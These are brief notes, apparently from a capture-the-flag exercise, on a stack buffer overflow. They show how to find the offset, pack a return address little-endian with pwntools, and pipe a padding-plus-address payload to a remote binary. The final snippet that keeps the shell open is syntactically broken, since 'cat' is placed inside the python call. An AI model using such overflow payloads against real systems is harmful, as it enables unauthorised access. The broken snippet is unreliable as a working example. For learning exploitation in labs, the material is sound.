### N o T e S

---

firstly, find out the offset before which the program will not print flag. Then concatenate it with the address we want.

For example, in a question if offset is 20 and we need to return the address 0xcaf3baee, then 

```bash
>>> import pwn
>>> pwn.p32(0xcaf3baee)
b'\xee\xba\xf3\xca'

# --> Little endian notation.
```

Payload --> python -c 'print("A"*20+"\xee\xba\xf3\xca")' > payload

```py
print("A"*20+"\xee\xba\xf3\xca")
AAAAAAAAAAAAAAAAAAAAîºóÊ
```

When we run this payload with the remote server, we can get access to the local files.

#### In case the stdout closes using payload try this : 

```py
python -c 'print("A"*20+"\xee\xba\xf3\xca" ; cat)'
```

  

---

